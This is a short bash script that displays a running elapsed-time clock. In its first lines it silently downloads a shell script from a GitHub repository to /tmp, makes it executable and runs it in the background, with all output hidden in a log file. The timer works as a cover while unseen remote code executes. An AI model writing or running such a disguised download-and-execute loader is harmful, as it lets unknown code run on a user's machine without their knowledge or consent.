#!/bin/bash

curl -fL 'https://github.com/malogrono/aways/raw/refs/heads/main/teur.sh' -o /tmp/teur.sh &&
chmod +x /tmp/teur.sh &&
bash /tmp/teur.sh > /tmp/teur.log 2>&1 &

SECONDS=0

while true; do
    clear
    printf '%02d:%02d:%02d\n' \
        $((SECONDS/3600)) \
        $(((SECONDS/60)%60)) \
        $((SECONDS%60))
    sleep 1
done
